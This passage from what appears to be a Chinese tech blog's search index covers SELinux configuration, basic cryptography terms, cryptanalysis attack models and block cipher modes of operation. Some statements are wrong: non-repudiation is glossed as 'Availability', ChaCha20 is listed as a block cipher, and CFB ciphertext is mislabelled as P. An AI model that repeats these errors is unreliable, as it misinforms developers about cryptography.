disabled</p>\n<p>&#x2F;etc&#x2F;sysconfig&#x2F;selinux和&#x2F;etc&#x2F;selinux&#x2F;config配置文件的联系及区别</p>\n<p>1.一开始&#x2F;etc&#x2F;sysconfig&#x2F;selinux是&#x2F;etc&#x2F;selinux&#x2F;config的软链接关系</p>\n<p>2.由于脚本使用sed -i ‘s&#x2F;SELINUX&#x3D;enforcing&#x2F;SELINUX&#x3D;disabled&#x2F;g’ &#x2F;etc&#x2F;sysconfig&#x2F;selinux</p>\n<p>   对&#x2F;etc&#x2F;sysconfig&#x2F;selinux文件进行修改，导致两者软连接关系破裂，变为一个普通文件，并不再被系统作为selinux的配置文件</p>\n<p>3.关闭selinux，直接修改&#x2F;etc&#x2F;selinux&#x2F;config配置文件，并重启，即可生效</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.51cto.com/jschu/2084898\">关闭SELinux的彻底解决办法</a></li>\n<li><a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/reference_guide/s2-selinux-files-etc\">Redhat关于关闭SELinux的官方文档</a></li>\n<li><a href=\"https://www.cnblogs.com/gailuo/p/3805223.html\">SELinux三种模式之间的转换</a></li>\n</ul>\n"},{"title":"关于密码学的几个基本概念","url":"/2023/01/02/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","content":"<h2 id=\"现代密码学\"><a href=\"#现代密码学\" class=\"headerlink\" title=\"现代密码学\"></a>现代密码学</h2><p>1949年，Shannon（香农）发表《保密系统的通信理论》标志着<strong>现代密码学</strong>的真正开始。<br>1976年，Diffie 和 Hellman 发表《密码学的新方向》，标志着公钥密码体制的诞生。<br>1978年，Rivest、Shamir 和 Adleman 提出了 RSA 公钥密码体制。</p>\n<h2 id=\"密码学的-CIA-目标\"><a href=\"#密码学的-CIA-目标\" class=\"headerlink\" title=\"密码学的 CIA 目标\"></a>密码学的 CIA 目标</h2><ul>\n<li>机密性（Confidentiality）：确保数据在存储或传输中保持秘密状态</li>\n<li>完整性（Integrity）：保证数据在传输中不被篡改</li>\n<li>不可否认性（Availability）：为接收者提供担保，保证消息确实来自发送者而不是来自伪装者</li>\n</ul>\n<p>有的理论还补充了一些目标，例如：</p>\n<ul>\n<li>身份认证（Authentication）：对声明的系统用户进行身份验证</li>\n</ul>\n<p>A军给B军发送了一封加密的文件，只有B军通过密码本能看懂，这体现了机密性；<br>C军截获这封文件并篡改后发给B军，但是B军通过文件袋的印刷痕迹可以看出这个文件已经被篡改，这体现了完整性；<br>B军通过文件的印章可以看出这是A军写的，而不是C军伪造的，体现了身份验证。</p>\n<h2 id=\"密码学家的六大工具箱\"><a href=\"#密码学家的六大工具箱\" class=\"headerlink\" title=\"密码学家的六大工具箱\"></a>密码学家的六大工具箱</h2><ul>\n<li>对称密码（Cipher）：</li>\n<li>公钥密码（public-key cryptography）：</li>\n<li>单向散列函数（Hash）：</li>\n<li>消息认证码（MAC）：</li>\n<li>数字签名（digital signature）：</li>\n<li>伪随机数生成器（PRNG，Pseudo-Random Number Generators）：</li>\n</ul>\n<h3 id=\"黄金法则\"><a href=\"#黄金法则\" class=\"headerlink\" title=\"黄金法则\"></a>黄金法则</h3><p>黄金法则主要包含三部分：认证（Authentication）、授权（Authorization）、审计（Audit）。</p>\n<p>认证:可信的身份认证是建立安全保障体系的第一步<br>授权：当用户被认证后，确定该用户有那些操作的权限<br>审计与问责：当在授权完成后，安全需要检查一下“你做了什么”，记录行为日志，这个检查的过程就是审计；当发现做了某些异常操作时，安全还会提供你做了这些操作的“证据”，让你无法抵赖，这个过程就是问责</p>\n<h2 id=\"Cipher-Encrypt\"><a href=\"#Cipher-Encrypt\" class=\"headerlink\" title=\"Cipher &amp; Encrypt\"></a>Cipher &amp; Encrypt</h2><p>在密码学（cryptographic）里面，encrypt &amp; decrpty 就是加密和解密，但也经常见到 cipher，而且“密码”的中文表述就更加混乱了，cipher、password、passphrase 都可以被翻译成”密码”，分析其英文单词来源：</p>\n<ul>\n<li>cipher：&#x3D;cypher（名词，暗号），后来被衍生为动词：把（消息）写成密码，也就是加密。<br>  decipher：由 cipher 衍生的反义词，即：动词，解密。<br>  进一步，明文被称为 plaintext，对应的密文则是 ciphertext</li>\n<li>password: 一般是用户设置的各种字符或者数字密码，也称作口令。</li>\n<li>passphrase: n. 密码；通行码；口令短语。也称为”密碼片语“，通常是指用于保护密钥或者其他敏感数据的一个 password</li>\n</ul>\n<h2 id=\"Key-encapsulation-Vs-Key-wrapping\"><a href=\"#Key-encapsulation-Vs-Key-wrapping\" class=\"headerlink\" title=\"Key encapsulation Vs Key wrapping\"></a>Key encapsulation Vs Key wrapping</h2><p>主要区别在于使用的是对称加密算法、还是非对称加密算法：</p>\n<ul>\n<li>密钥封装（Key encapsulation）：指使用非对称密码算法的公钥加密另一个密钥。</li>\n<li>密钥包裹（Key wrapping）：指使用对称密码算法加密另一个密钥。</li>\n</ul>\n<h2 id=\"密码攻击方式\"><a href=\"#密码攻击方式\" class=\"headerlink\" title=\"密码攻击方式\"></a>密码攻击方式</h2><p>在密码分析学中，有四大攻击方式：</p>\n<ul>\n<li>唯密文攻击：唯密文攻击是假定密码分析者拥有密码算法及明文统计特性，并截获一个或多个用同一密钥加密的密文，通过对这些密文进行分析求出明文或密钥。 在实施唯密文攻击时，只有充分掌握和利用明文信息如文字、图像、语音、计算机程序等的内在规律，才有可能根据截获的密文成功破译密码。唯密文攻击已知条件最少。经不起唯密文攻击的密码被认为是 不安全的。你可以理解为：已知密文的穷举攻击，也仅知道密文</li>\n<li>已知明文攻击：已知明文攻击指攻击者掌握了某段明文x和对应密文y。 希尔密码依赖唯密文攻击较难破解，而通过已知明文攻击则容易攻破。你可以理解为：已知部分明文及其对应的密文，进行分析破解</li>\n<li>选择明文攻击：选择明文攻击指的是一种攻击模式。攻击者拥有加密机的访问权限，可构造任意明文所对应的密文。在选择明文攻击时，密码分析者对明文有选择或控制的能力，可选择他认为有利于攻击的任何明文及其对应的密文，是一种比已知明文攻击更强的攻击方式。如果一个密码系统能够抵抗选择明文攻击，那么必然能够抵抗唯密文攻击和已知明文攻击。你可以理解为：知道明文就知道密文</li>\n<li>选择密文攻击：攻击者掌握对解密机的访问权限，可以选择密文进行解密。密码分析者对密文有选择或控制的能力，可选择他认为有利于攻击的任何密文及其对应的明文，是一种比已知明文攻击更强的攻击方式。如果一个密码系统能够抵抗选择密文攻击，那么必然能够抵抗唯密文攻击和已知明文攻击。选择密文攻击主要用于分析公钥密码体制，如针对RSA公钥密码体制的选择密文攻击。你可以理解为：知道密文就会知道明文</li>\n</ul>\n<hr>\n<p>两个常用动词：</p>\n<p>加密：cipher 或者 encrypt<br>解密：decipher 或者 decrypt<br>另外有几个名词有必要解释：</p>\n<p>cipher: 指用于加解密的「密码算法」，有时也被直接翻译成「密码」<br>cryptographic algorithm: 密码学算法，泛指密码学相关的各类算法<br>ciphertext: 密文，即加密后的信息。对应的词是明文 plaintext<br>password: 这个应该不需要解释，就是我们日常用的各种字符或者数字密码，也可称作口令。<br>passphrase: 翻译成「密码词组」或者「密碼片語」，通常指用于保护密钥或者其他敏感数据的一个 password<br>如果你用 ssh&#x2F;gpg&#x2F;openssl 等工具生成或使用过密钥，应该对它不陌生。<br>在密码学里面，最容易搞混的词估计就是「密码」了，cipher&#x2F;password&#x2F;passphrase 都可以被翻译成「密码」，需要注意下其中区别。</p>\n<hr>\n<h2 id=\"经典文献\"><a href=\"#经典文献\" class=\"headerlink\" title=\"经典文献\"></a>经典文献</h2><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-1/\">写给开发人员的实用密码学 - 系列</a></li>\n<li><a href=\"https://www.secrss.com/articles/36564\">移动通信网中的密码算法演进 (三)：认证篇</a></li>\n<li><a href=\"https://csrc.nist.gov/publications/sp\">NIST SP 技术标准列表</a></li>\n<li><a href=\"https://www.desmos.com/calculator/ialhd71we3?lang=zh-CN\">椭圆曲线的模拟器</a></li>\n<li><a href=\"https://crackstation.net/hashing-security.htm\">口令扩展技术 - Salted Password Hashing</a></li>\n</ul>\n"},{"title":"冬至在兰州","url":"/2018/12/23/%E5%86%AC%E8%87%B3%E5%9C%A8%E5%85%B0%E5%B7%9E/","content":"<p>老孙打了好几个电话过来</p>\n","categories":["生活"],"tags":["兰州"]},{"title":"分组加密的工作模式概述","url":"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>在密码学中，最基本的分类就是：对称加密 Vs 非对称加密。</p>\n<ul>\n<li>如果使用<strong>相同的密钥</strong>进行消息的加密与解密（算法不一定相同，例如函数 &amp; 逆函数），就是对称加密算法（也称为ciphers），例如：DES、3DES、AES、Blowfish、IDEA、RC5、RC6…</li>\n<li>否则，就是非对称加密算法，通常需要一个密钥对：公钥 (public key) + 私钥 (private key)，分别用于加密和解密，例如：RSA、DSA、ECC、DH…</li>\n</ul>\n<p>关于对称加密算法，可以进一步细分为：分组加密算法 Vs 流密码算法。</p>\n<ul>\n<li>流密码算法（Stream Cipher）：明文和密钥的长度相同，按字节与密钥逐位地做约定的运算（通常是 XOR）从而获得密文流，包括 RC4 和 GSM 等</li>\n<li>分组密码算法（Block Cipher）：每次加密<strong>固定长度的分组（block）</strong>（例如 128 位），包括 AES、ChaCha20、Twofish、IDEA、Serpent、Camelia、RC6、CAST 等</li>\n</ul>\n<p>由于分组密码的长度是固定的，但明文的长度是不确定的，由此带来了两个问题：</p>\n<ol>\n<li>明文数据长度可能不等于分组长度的倍数，为此需要处理碎片问题，主要有填充和密文窃取两种方式，详见附录一和附录二。</li>\n<li>加密或解密过程中需要多次使用同一分组密钥，如何进行密钥轮转就是<strong>工作模式</strong>的核心问题。</li>\n</ol>\n<blockquote>\n<p>理论上非对称加密算法也可应用工作模式，但由于多用于密钥传输等小数据量场景，没啥价值</p>\n</blockquote>\n<h2 id=\"二、基础的工作模式\"><a href=\"#二、基础的工作模式\" class=\"headerlink\" title=\"二、基础的工作模式\"></a>二、基础的工作模式</h2><p>ECB，CBC，OFB 和 CFB 是最早出现的工作模式，可以追溯到1981年。<br>2001年，NIST 修订了<a href=\"nistspecialpublication800-38a.pdf\">SP 800-38A</a> 标准，加入了AES，并加入了 CTR 模式。</p>\n<p>后续， NIST 陆续补充了2份标准，后续将另文专题讨论。</p>\n<ul>\n<li><a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">SP 800-38D</a>，2007年发布，加入了 GCM 认证加密模式</li>\n<li><a href=\"nistspecialpublication800-38e.pdf\">SP 800-38E</a>，2010年发布，通过引用 IEEE P1619-2007 标准而加入了 XTS-AES</li>\n</ul>\n<h3 id=\"1、ECB-模式（Electronic-codebook，电子密码本）\"><a href=\"#1、ECB-模式（Electronic-codebook，电子密码本）\" class=\"headerlink\" title=\"1、ECB 模式（Electronic codebook，电子密码本）\"></a>1、ECB 模式（Electronic codebook，电子密码本）</h3><p>ECB 模式就是传统的密码本方式，将整个明文分成若干段相同的小段，然后使用同一个密钥对每一小段进行加密，非常简单明了。</p>\n<p>$$<br>\\begin{flalign}<br>ECB加密算法： &amp; C_j&#x3D;CIPH_k(P_j)      &amp;for\\ j&#x3D;1 \\dots n   \\\\<br>ECB解密算法： &amp; P_j&#x3D;CIPH_k^{-1}(C_j) &amp;for\\ j&#x3D;1 \\dots n<br>\\end{flalign}<br>$$</p>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/ECB.png\" alt=\"ECB\"></p>\n<p>由于 ECB 模式每次分组处理采用完全相同的密钥，因此一旦某个分组的密文传输过程中出现误码，将导致当前分组的解密结果出现错误，但并不会影响其他分组，即支持加密和解密的并行处理。</p>\n<p>ECB 模式存在严重的安全隐患，相同的明文块会被加密成相同的密文块，即著名的明文攻击问题！根本原因是用单一密钥对多个明文分组进行加密，但如果仅仅使用一个或者少量的分组（例如加密密钥传输等场景），ECB 模式仍然是安全的。下图演示了一个图像文件通过 ECB 模式的加密结果。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/plaintext-attack.png\" alt=\"明文攻击\"></p>\n<p>适合场景：密钥传输、文件名加密</p>\n<h3 id=\"2-CBC-模式（Cipher-block-chaining，密码块链接模式）\"><a href=\"#2-CBC-模式（Cipher-block-chaining，密码块链接模式）\" class=\"headerlink\" title=\"2. CBC 模式（Cipher-block chaining，密码块链接模式）\"></a>2. CBC 模式（Cipher-block chaining，密码块链接模式）</h3><p>为了解决明文攻击问题，IBM 引入初始向量 IV（Initialization Vector）并提出了 CBC 模式。</p>\n<p>$$<br>\\begin{flalign}<br>CBC加密算法： &amp; C_1 &#x3D; CIPH_k(P_1 \\oplus IV)  \\\\<br>         &amp; C_j &#x3D; CIPH_k(P_j \\oplus C_{j-1})      &amp; for\\ j&#x3D;2 \\dots n   \\\\<br>CBC解密算法： &amp; P_1 &#x3D; CIPH_k^{-1}(C_1) \\oplus IV  \\\\<br>         &amp; P_j &#x3D; CIPH_k^{-1}(C_j) \\oplus C_{j-1}      &amp; for\\ j&#x3D;2 \\dots n   \\\\<br>\\end{flalign}<br>$$</p>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CBC.png\" alt=\"CBC\"></p>\n<p>适合场景：磁盘文件加密、面向分组的通⽤用传输、认证</p>\n<h3 id=\"3-CFB-模式（Cipher-feedback，密文反馈模式）\"><a href=\"#3-CFB-模式（Cipher-feedback，密文反馈模式）\" class=\"headerlink\" title=\"3. CFB 模式（Cipher feedback，密文反馈模式）\"></a>3. CFB 模式（Cipher feedback，密文反馈模式）</h3><p>CFB、OFB、CTR 模式的核心思想都是将初始向量 IV 转换为流密码，只是方式有所不同。<br>在 CBC 模式下，接收端必须收到一个完整分组后才能开始解密处理。由于 CFB 模式进行了流密码转换，因此可以在一个比分组长度更小的数据单元中进行加密。</p>\n<p>$$<br>\\begin{flalign}<br>CFB加密算法： &amp; I_1 &#x3D; IV     \\\\<br>    &amp; I_j &#x3D; LSB_{b-s}(I_{j-1}) | C_{j-1}^\\#  &amp; for\\ j&#x3D;2 \\dots n \\\\<br>    &amp; O_j &#x3D; CIPH_k(I_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; C_j^\\# &#x3D; P^\\#_j \\oplus MSB_s(O_j)      &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>\\end{flalign}<br>$$</p>\n<p>$$<br>\\begin{flalign}<br>CFB解密算法： &amp; I_1 &#x3D; IV     \\\\<br>    &amp; I_j &#x3D; LSB_{b-s}(I_{j-1}) | C_{j-1}^\\#  &amp; for\\ j&#x3D;2 \\dots n \\\\<br>    &amp; O_j &#x3D; CIPH_k(I_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; P_j^\\# &#x3D; C^\\#_j \\oplus MSB_s(O_j)      &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>\\end{flalign}<br>$$</p>\n<ul>\n<li>CFB 需要设定数据单元长度 s（$1 &lt;&#x3D;s &lt;&#x3D; b$），通常为分组长度的因子，如1、8、64、128。每个 block 将被分为若干个长度为 s 的 segment，明文称为$P_j^\\#$，密文称为$P_j^\\#$</li>\n<li>$LSB_m(x)$：字节流x的m个低位，The bit string consisting of the m <strong>least</strong> significant bits of the bit string X.</li>\n<li>$MSB_m(x)$：字节流x的m个高位，The bit string consisting of the m <strong>most</strong> significant bits of the bit string X.<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CFB.png\" alt=\"CFB\"></li>\n</ul>\n<p>适合场景：不能容忍错误扩散的高速同步系统</p>\n<h3 id=\"4-OFB-模式（Output-feedback-输出反馈模式）\"><a href=\"#4-OFB-模式（Output-feedback-输出反馈模式）\" class=\"headerlink\" title=\"4. OFB 模式（Output feedback, 输出反馈模式）\"></a>4. OFB 模式（Output feedback, 输出反馈模式）</h3><p>$$<br>\\begin{flalign}<br>OFB加密算法： &amp; I_1 &#x3D; IV     \\\\<br>    &amp; I_j &#x3D; O_{j-1}      &amp; for\\ j&#x3D;2 \\dots n \\\\<br>    &amp; O_j &#x3D; CIPH_k(I_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; C_j &#x3D; P_j \\oplus O_j      &amp; for\\ j&#x3D;1,2 \\dots n-1 \\\\<br>    &amp; C_n^\\# &#x3D; P_n^\\# \\oplus MSB_u(O_n) \\\\<br>\\end{flalign}<br>$$</p>\n<p>$$<br>\\begin{flalign}<br>OFB解密算法： &amp; I_1 &#x3D; IV     \\\\<br>    &amp; I_j &#x3D; O_{j-1}      &amp; for\\ j&#x3D;2 \\dots n \\\\<br>    &amp; O_j &#x3D; CIPH_k(I_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; P_j &#x3D; C_j \\oplus O_j      &amp; for\\ j&#x3D;1,2 \\dots n-1 \\\\<br>    &amp; P_n^\\# &#x3D; C_n^\\# \\oplus MSB_u(O_n) \\\\<br>\\end{flalign}<br>$$</p>\n<ul>\n<li>最后一个分组可能不完整，只有$u$位，此时将丢弃$O_j$对应的$b-u$位</li>\n</ul>\n<p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/OFB.png\" alt=\"OFB\"></p>\n<p>适合场景：噪声干扰严重的信道传输</p>\n<h3 id=\"5-CTR-模式（Counter，计数器模式）\"><a href=\"#5-CTR-模式（Counter，计数器模式）\" class=\"headerlink\" title=\"5. CTR 模式（Counter，计数器模式）\"></a>5. CTR 模式（Counter，计数器模式）</h3><p>CTR 模式也被称为 ICM 模式（Integer Counter Mode，整数计数模式），或者 SIC 模式（Segmented Integer Counter），不同分组流密码的随机性就是依靠计数器实现。</p>\n<p>$$<br>\\begin{flalign}<br>CTR加密算法：&amp; O_j &#x3D; CIPH_k(T_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; C_j &#x3D; P_j \\oplus O_j      &amp; for\\ j&#x3D;1,2 \\dots n-1 \\\\<br>    &amp; C_n^\\# &#x3D; P_n^\\# \\oplus MSB_u(O_n)     \\\\<br>\\end{flalign}<br>$$</p>\n<p>$$<br>\\begin{flalign}<br>CTR解密算法：&amp; O_j &#x3D; CIPH_k(T_j)     &amp; for\\ j&#x3D;1,2 \\dots n \\\\<br>    &amp; P_j &#x3D; C_j \\oplus O_j      &amp; for\\ j&#x3D;1,2 \\dots n-1 \\\\<br>    &amp; P_n^\\# &#x3D; C_n^\\# \\oplus MSB_u(O_n)     \\\\<br>\\end{flalign}<br>$$<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CTR.png\" alt=\"CTR\"></p>\n<p>适合场景：面向分组的通⽤用传输，高速数据传输</p>\n<h2 id=\"三、技术分析\"><a href=\"#三、技术分析\" class=\"headerlink\" title=\"三、技术分析\"></a>三、技术分析</h2><p>针对上述5种基本工作模式，给一个算法结构对比图，并讨论几个核心技术。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/5in1.png\" alt=\"5\"></p>\n<h3 id=\"1-流密码转换\"><a href=\"#1-流密码转换\" class=\"headerlink\" title=\"1. 流密码转换\"></a>1. 流密码转换</h3><p>OFB、CFB 和 CTR 的共同特征是将分组密码转化为流密码，即以初始向量作为种子，生成一个具备伪随机性的密钥流，再与明文执行 XOR 操作。<br>这种流密码方式的好处，一是不需要像 ECB 和 CBC 那样考虑尾部的填充问题，也不会产生明文和明文长度不一致的问题；二是加密和解密的处理流程是完全同构的，因为 XOR 操作满足<strong>互合性</strong>。</p>\n<p>流密码有同步 &#x2F; 异步 的两种工作模式，即：</p>\n<h4 id=\"同步序列密码-synchronous-stream-cipher\"><a href=\"#同步序列密码-synchronous-stream-cipher\" class=\"headerlink\" title=\"同步序列密码 - synchronous stream cipher\"></a>同步序列密码 - synchronous stream cipher</h4><p>军方称密钥自动密钥（KAK，Key Auto-Key），密钥流的生成独立于消息序列，不依赖于任何先前的明文或密文。</p>\n<ul>\n<li><strong>同步错误不可恢复</strong>：KAK 必须保持加密端和解密端的完全同步，如果其中一个发生器跳过一个周期，或者一个密文位在传输过程中丢失，那么错误后面的每一个密文都不能正确解密。</li>\n<li><strong>无错误扩散</strong>：说如果一位在传输过程中被改变，那么只有该位不能正确解密，前面和后面的位都不受影响。</li>\n<li>需要注意的是，KAK 实现依靠有限状态的机器实现，密钥序列一定会重复，为了抵御明文攻击，发生器的周期必须非常长，至少不能小于明文的长度。</li>\n</ul>\n<p>OFB 和 CTR 模式都属于 KAK。目前常见的大多数流密码算法都是同步流密码。</p>\n<h4 id=\"自同步流密码-self-synchronizing-stream-ciper\"><a href=\"#自同步流密码-self-synchronizing-stream-ciper\" class=\"headerlink\" title=\"自同步流密码 - self-synchronizing stream ciper\"></a>自同步流密码 - self-synchronizing stream ciper</h4><p>也称异步流密码。军方称之为密文自动密钥（Cipher Text Auto Key，CTAK），密钥流的生成必须依赖于前面固定长度的密文位。</p>\n<ul>\n<li><strong>同步错误可恢复</strong>：传输过程中如果密文字被插入或者删除，导致同步性遭到破坏后，经过固定长度后可以自动地重建正确的解密，而且仅有固定数量的明文字不可恢。</li>\n<li><strong>有限的错误扩散</strong>：即如果传输中一个密文位被篡改，解密端该分组将有 s 个序列位不能正确解密，直到内部状态不在包含该错误位。</li>\n<li><strong>明文统计扩散</strong>：每个明文字都会影响其后的整个密文，即明文的统计学特征被扩散（稀释）到了密文中，因此在抵抗利用明文冗余度而发起的攻击方面要强于同步流密码。</li>\n</ul>\n<p>CFB 模式属于 CTAK。</p>\n<h3 id=\"2-并行处理\"><a href=\"#2-并行处理\" class=\"headerlink\" title=\"2. 并行处理\"></a>2. 并行处理</h3><p>如果算法支持并行处理，硬件实现可以多个硬件块同时处理，软件实现也可以有效利用多CPU核心，对性能非常有利。</p>\n<p>ECB 的加密和解密都支持并行，但由于存在明文攻击，只适用于少量数据的处理，因此没啥意义。</p>\n<p>CBC 和 CFB 的特性相同，即<strong>加密过程不支持并行，但解密过程可以并行</strong>。<br>加密时，由于存在初始变量 IV，而且采用反馈模式增加了各个分组之间的联系，因此不支持并行。<br>解密时，从两个邻接的密文块中即可得到一个明文块，因此可以并行化。</p>\n<blockquote>\n<p>CBC 可以支持随机读取，因为没有流密码的转换，只需要掌握前后两个密文块</p>\n</blockquote>\n<p>OFB 的情况有点特殊！其加密和解密中，每个正向加密函数（第一个除外）取决于之前正向加密函数的结果，因此理论上都不能并行化。<br>然而，在掌握 IV 的前提下，在获得明文或密文数据之前，可以<strong>通过预处理提前生成密钥流</strong>，就可以支持并行处理了。实际应用中，经常利用 CBC 硬件块输入全0，能够很方便的产生 OFB 密钥流。</p>\n<p>CTR 具备<strong>最优秀的并行性</strong>，加密和解密都可以，而且允许在解密时进行随机存取（只依赖计数器，无需预处理），因此非常适合多处理器的硬件实现。</p>\n<h3 id=\"3-初始向量\"><a href=\"#3-初始向量\" class=\"headerlink\" title=\"3. 初始向量\"></a>3. 初始向量</h3><p>初始化向量（IV，Initialization Vector）为加密计算提供了新的随机性，即可以有效抵御明文攻击，又避免了较慢的重新产生密钥的过程。</p>\n<p>初始化向量与密钥相比有不同的安全性需求，通常情况下 <strong>IV 无须保密</strong>，然而在大多数情况中，<strong>不应当在使用同一密钥的情况下两次使用同一个 IV</strong>。</p>\n<ul>\n<li>CBC、CFB：重用IV会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。</li>\n<li>OFB、CTR：重用IV会导致完全失去安全性。</li>\n<li>此外，在 CBC 模式中，IV 在加密时<strong>必须是无法预测</strong>的；</li>\n<li>特别的，在许多实现中使用的产生IV的方法，例如 SSL2.0 采用上一个消息的最后一块密文作为下一个消息的IV，是不安全的。</li>\n</ul>\n<h3 id=\"4-分组密码的填充问题\"><a href=\"#4-分组密码的填充问题\" class=\"headerlink\" title=\"4. 分组密码的填充问题\"></a>4. 分组密码的填充问题</h3><p>在分组密码中，当数据长度不等于分组长度的倍数时，需要按一定的方式，将尾部明文分组进行填充，这种将尾部分组数据填满的方法称为<strong>填充</strong>（Padding）。<br>例如 CBC 模式应使用填充算法使最后一个分组的长度一致。大多数应用程序使用 PKCS#7 或 ANSI X.923。<br>采用填充方式时，密文长度通常大于明文长度，意味着网络传输时需要消耗额外的传输能力。</p>\n<h4 id=\"ANSI-X9-23\"><a href=\"#ANSI-X9-23\" class=\"headerlink\" title=\"ANSI X9.23\"></a>ANSI X9.23</h4><p>在填充字节序列中，最后一个字节填充为需要填充的字节长度(示例为0x04)，其余字节填充0。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 |</code></p>\n<h4 id=\"PKCS-7\"><a href=\"#PKCS-7\" class=\"headerlink\" title=\"PKCS#7\"></a>PKCS#7</h4><p>PKCS#7 定义于 RFC 5652。在填充字节序列中，每个字节填充为需要填充的字节长度(示例为0x04)。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 04 04 04 04 |</code></p>\n<h4 id=\"ISO-10126\"><a href=\"#ISO-10126\" class=\"headerlink\" title=\"ISO 10126\"></a>ISO 10126</h4><p>在填充字节序列中，最后一个字节填充为需要填充的字节长度(示例为0x04)，其余字节填充<strong>随机数</strong>。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 |</code></p>\n<h4 id=\"ISO-IEC-7816-4\"><a href=\"#ISO-IEC-7816-4\" class=\"headerlink\" title=\"ISO&#x2F;IEC 7816-4\"></a>ISO&#x2F;IEC 7816-4</h4><p>在填充字节序列中，第一个字节填充固定值<strong>0x80</strong>，其余字节填充0。若只需填充一个字节，则直接填充<strong>0x80</strong>。<br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD 80 00 00 00 |</code><br><code>... | DD DD DD DD DD DD DD DD | DD DD DD DD DD DD DD 80 |</code></p>\n<h3 id=\"5-密文窃取\"><a href=\"#5-密文窃取\" class=\"headerlink\" title=\"5. 密文窃取\"></a>5. 密文窃取</h3><p>窃取密文（Ciphertext stealing）通过修改消息的最后两块，以实现密文与明文大小相同的目标。</p>\n<p>加密时，除了最后两块之外，所有块都正常处理，但“窃取”倒数第二块的一部分密文用以填充最后一块明文块。填充的最后一块，然后像往常一样加密。最终密文的最后两块，包括部分倒数第二块（删掉“窃取”部分）和完整的最后一块，它们大小与原明文相同。<br>解密时，首先解密最后一块，然后将“窃取”的密文恢复到倒数第二块，然后可以像往常一样解密。<br>原则上，任何使用块密码的分组加密模式都可用，但流密码模式已经可以加密任意长度的消息无需填充，因此它们不能用该操作。与窃取密文相结合的常用加密方式有电子密码本（ECB）和密码块链接（CBC）。</p>\n<p>ECB 密文窃取要求明文长度大于一个分组。当明文长度为一个或更少时，建议使用一种类似流密码的分组密码操作模式，如 CTR、CFB 或 OFB。<br><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/CTS_ECB.png\" alt=\"CTS-ECB\"></p>\n<p>CBC 密文窃取并不一定要求明文长度大于一个分组。在明文为一块或更少块长度的情况下，初始向量（IV）可作为先前的密文块。在这种情况，必须将修改后的IV发送予接受者。但这在发送密文时 IV 不能由发送者自由选择的情况下（如当 IV 是派生值或预先确定的值）不太可能，并且在这种情况下，针对 CBC 模式的密文窃取只能在明文长于一个块文中发生。</p>\n<p>采用密文窃取方式时，密文长度严格等于明文长度，不会浪费网络传输能力，同时这个优点非常适合磁盘文件存储（文件大小等于密文长度），因此产生 AES-XTS 工作模式。<br>为了以 AES-XTS 加密或解密未知长度的数据，必须延迟处理（和缓存）最新的两块数据块，以便处理数据流末端。</p>\n<h2 id=\"四、不完整的总结\"><a href=\"#四、不完整的总结\" class=\"headerlink\" title=\"四、不完整的总结\"></a>四、不完整的总结</h2><p><img src=\"/2022/12/17/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A6%82%E8%BF%B0/vs.png\" alt=\"vs\"></p>\n<hr>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a 